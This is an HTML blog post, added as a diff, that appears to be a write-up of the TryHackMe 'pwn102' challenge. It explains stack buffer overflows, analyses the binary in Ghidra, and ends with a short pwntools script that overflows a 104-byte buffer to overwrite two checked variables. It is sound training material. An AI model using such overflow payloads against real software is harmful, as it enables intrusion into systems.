@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en-us">
+<head><script src="/blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=blog/livereload" data-no-instant defer></script>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="theme-color" content="#1b1b1b">
+	<title>pwn102 | Dexter</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		
+  <meta itemprop="name" content="pwn102">
+  <meta itemprop="description" content="102 Intoroduction So for the next challenge we are required to modify a variable’s value. This occurs when data larger than the allocated memory space (buffer) is written into that buffer. As a result, it can overwrite adjacent memory, including variables. But then if the stack grows downwards and the return address is above the variables space it should write the the memory below and not above, right? No, what happens is functions called later get stack frames at lower memory, and the return address is pushed to the higher address than the local variables. But arrays and buffers are indexed upwards in memory, so writing past the end of the array will nicely land on the return address next on the stack.">
+  <meta itemprop="datePublished" content="2024-01-10T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2024-01-10T00:00:00+00:00">
+  <meta itemprop="wordCount" content="456">
+  <meta itemprop="keywords" content="Tryhackme">
+	<link rel="stylesheet" href="/blog/css/bundle.css">
+	<link rel="icon" href="/blog/icons/16.png" sizes="16x16" type="image/png">
+	<link rel="icon" href="/blog/icons/32.png" sizes="32x32" type="image/png">
+</head>
+<body class="body kind-page">
+	<header class="header">
+	<a class="logo" href="/blog/">Dexter</a>
+	
+</header>
+	<div class="primary">
+	
+	<main class="main">
+		
+		<div class="single block">
+			<article class="entry">
+				<h1 class="entry__title">pwn102</h1>
+<details class="entry__toc toc" open>
+	<summary class="toc__title">Table of Contents</summary>
+	<nav id="TableOfContents">
+  <ul>
+    <li><a href="#102">102</a>
+      <ul>
+        <li><a href="#intoroduction">Intoroduction</a></li>
+        <li><a href="#analysis">Analysis</a></li>
+        <li><a href="#exploit">Exploit</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</details>
+				<div class="entry__content"><h2 id="102">102</h2>
+<h3 id="intoroduction">Intoroduction</h3>
+<p>So for the next challenge we are required to modify a variable&rsquo;s value. This occurs when data larger than the allocated memory space (buffer) is written into that buffer. As a result, it can overwrite adjacent memory, including variables. But then if the stack grows downwards and the return address is above the variables space it should write the the memory below and not above, right? No, what happens is functions called later get stack frames at lower memory, and the return address is pushed to the higher address than the local variables. But arrays and buffers are indexed upwards in memory, so writing past the end of the array will nicely land on the return address next on the stack.</p>
+<p>The stack would look like this:</p>
+<pre tabindex="0"><code> &lt;---- stack grows to the left
+    memory addresses increase to the right --&gt;
+  0x8000                        0x8010
+  +--------+----------+---------++------------
+  + buf[8] | ret addr | char *s ||   ....... 
+  +--------+----------+---------++--------------
+</code></pre><p>Let&rsquo;s analyze the binary in ghidra for a better look.</p>
+<h3 id="analysis">Analysis</h3>
+<p><img src="https://i.ibb.co/N2bFgf6/ghidra.png" alt="4"></p>
+<p>Here we can see that we have a buffer set to 104, meaning we can input data larger than 104 and be able to modify the variables that come in after. We can now see that we have two variables that have been defined. We can also see an if function that checks if the two variables are equal to some values, if not the program exits. Since we now know what the two values should be equal to, let us modify them.</p>
+<h3 id="exploit">Exploit</h3>
+<p>After the disassembly we can now come up with our very own exploit. This time we are going to be using pwntools to craft an exploit. Looking at our disassembled code in ghidra we can see that the values for parameter 1 and parameter 2 should be <code>0xc0ff33 and 0xc0d3</code> respectively. Due to little endianness we first pass in the second parameter and then the first parameter. Little Endianness refers to the byte order used to store data in computer memory. In a system that uses Little Endianness, the least significant byte (the &ldquo;little end&rdquo;) of a multi-byte value is stored at the lowest memory address, while the most significant byte (the &ldquo;big end&rdquo;) is stored at a higher memory address. To check for endianness you can use <code>rabin2 -I binary</code>.</p>
+<p>Awesome now with the information gathered lets craft an exploit.</p>
+<pre tabindex="0"><code>from pwn import *
+
+p = process(&#34;./pwn102.pwn102&#34;) # runs the binary locally
+#p = remote(&#34;ip_provided&#34;, 9002) # runs remotely
+
+param_1 = p32(0xc0ff33) # packed in 32 bit since it is short
+param_2 = p32(0xc0d3)
+
+payload = b&#39;A&#39; * 104 # filling the buffer with bunch of A&#39;s
+payload += param_2 
+payload += param_1
+
+p.sendlineafter(&#34;?&#34;, payload) # sending the payload
+p.interactive() # spawn a shell
+</code></pre></div>
+				
+				<footer class="entry__footer">
+					
+<div class="entry__tags">
+			<a class="entry__tag btn" href="/blog/tags/tryhackme/">Tryhackme</a>
+</div>
+					
+<div class="entry__share share">
+	<a class="share__link btn" title="Share on Twitter" href="https://twitter.com/intent/tweet/?url=http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2fthm%2fbinary102%2f&amp;text=pwn102" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on Twitter', 'width=800,height=450,resizable=yes,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="Twitter" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M437 152a72 72 0 0 1-40 12 72 72 0 0 0 32-40 72 72 0 0 1-45 17 72 72 0 0 0-122 65 200 200 0 0 1-145-74 72 72 0 0 0 22 94 72 72 0 0 1-32-7 72 72 0 0 0 56 69 72 72 0 0 1-32 1 72 72 0 0 0 67 50 200 200 0 0 1-105 29 200 200 0 0 0 309-179 200 200 0 0 0 35-37"/></svg>
+	</a>
+	<a class="share__link btn" title="Share on LinkedIn" href="https://www.linkedin.com/shareArticle?mini=true&url=http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2fthm%2fbinary102%2f&title=pwn102" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on LinkedIn', 'width=640,height=480,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="LinkedIn" role="img" width="32" height="32" viewBox="0 0 512 512"><circle cx="142" cy="138" r="37"/><path stroke-width="66" d="M244 194v198M142 194v198"/><path d="M276 282c0-20 13-40 36-40 24 0 33 18 33 45v105h66V279c0-61-32-89-76-89-34 0-51 19-59 32"/></svg>
+	</a>
+</div>
+				</footer>
+				
+			</article>
+		</div>
+	</main>
+	
+<div class="authorbox block">
+	<div class="author">
+		<div class="author__body">
+			<div class="author__name">
+				Dexter
+			</div>
+			<div class="author__bio">Just human</div>
+		</div>
+	</div>
+</div>
+	
+
+
+
+<div class="related block">
+	<h3 class="related__title">Related</h3>
+	<ul class="related__list">
+		
+		<li class="related__item"><a class="related__link" href="/blog/posts/thm/binary103/">pwn103</a></li>
+		
+		<li class="related__item"><a class="related__link" href="/blog/posts/thm/binary104/">pwn104</a></li>
+		
+		<li class="related__item"><a class="related__link" href="/blog/posts/thm/binary101/">pwn101</a></li>
+		
+	</ul>
+</div>
+
+	
+
+	</div>
+	<footer class="footer">
+<div class="footer__social social">
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="mailto:dexter7isme@gmail.com">
+			<svg class="social__icon" aria-label="Email" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M299 268l124 106c-4 4-10 7-17 7H106c-7 0-13-3-17-7l124-106 43 38 43-38zm-43 13L89 138c4-4 10-7 17-7h300c7 0 13 3 17 7L256 281zm54-23l121-105v208L310 258zM81 153l121 105L81 361V153z"/></svg>
+		</a>
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="https://github.com/w-47">
+			<svg class="social__icon" aria-label="Github" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M335 499c14 0 12 17 12 17H165s-2-17 12-17c13 0 16-6 16-12l-1-50c-71 16-86-28-86-28-12-30-28-37-28-37-24-16 1-16 1-16 26 2 40 26 40 26 22 39 59 28 74 22 2-17 9-28 16-35-57-6-116-28-116-126 0-28 10-51 26-69-3-6-11-32 3-67 0 0 21-7 70 26 42-12 86-12 128 0 49-33 70-26 70-26 14 35 6 61 3 67 16 18 26 41 26 69 0 98-60 120-117 126 10 8 18 24 18 48l-1 70c0 6 3 12 16 12z"/></svg>
+		</a>
+</div>
+	<div class="footer__copyright">© 2025 Dexter. <span class="footer__copyright-credits">Powered by <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/vimux/binario" rel="nofollow noopener" target="_blank">Binario</a> theme.</span></div>
+</footer>
+</body>
+</html>
